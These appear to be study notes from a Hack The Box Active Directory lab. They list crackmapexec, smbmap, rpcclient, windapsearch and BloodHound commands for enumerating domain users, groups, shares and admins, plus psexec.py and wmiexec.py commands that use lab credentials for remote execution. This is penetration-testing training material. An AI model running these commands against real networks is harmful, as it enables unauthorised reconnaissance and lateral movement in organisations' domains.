  
#### CME - Domain User Enumeration
```shell-session
Tachipy@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

#### CME - Domain Group Enumeration
```shell-session
Tachipy@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```
#### CME - Logged On Users

```shell-session
Tachipy@htb[/htb]$ sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```
#### Share Enumeration - Domain Controller
```shell-session
Tachipy@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
```
##### Spider_plus
```shell-session
Tachipy@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```
#### SMBMap To Check Access
```shell-session
Tachipy@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```
#### Recursive List Of All Directories
```shell-session
Tachipy@htb[/htb]$ smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```
### rpcclient
```bash
rpcclient -U "" -N 172.16.5.5
```
#### RPCClient User Enumeration By RID

```shell-session
rpcclient $> queryuser 0x457
```
#### Enumdomusers
```shell-session
rpcclient $> enumdomusers
```


### Using psexec.py

To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.

Code: bash

```bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125  
```
#### Using wmiexec.py
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5  
```

### WINDAPSearch
#### Windapsearch - Domain Admins
```shell-session
Tachipy@htb[/htb]$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

### Bloodhound
#### Executing BloodHound.py
```shell-session
Tachipy@htb[/htb]$ sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 
```
#### Viewing the Results

  Viewing the Results

```shell-session
Tachipy@htb[/htb]$ ls

20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json  
```

#### Upload the Zip File into the BloodHound GUI

We could then type `sudo neo4j start` to start the [neo4j](https://neo4j.com/) service, firing up the database we'll load the data into and also run Cypher queries against.

Next, we can type `bloodhound` from our Linux attack host when logged in using `freerdp` to start the BloodHound GUI application and upload the data. The credentials are pre-populated on the Linux attack host, but if for some reason a credential prompt is shown, use:

- `user == neo4j` / `pass == HTB_@cademy_stdnt!`.

Once all of the above is done, we should have the BloodHound GUI tool loaded with a blank slate. Now we need to upload the data. We can either upload each JSON file one by one or zip them first with a command such as `zip -r ilfreight_bh.zip *.json` and upload the Zip file. We do this by clicking the `Upload Data` button on the right side of the window (green arrow). When the file browser window pops up to select a file, choose the zip file (or each JSON file) (red arrow) and hit `Open`.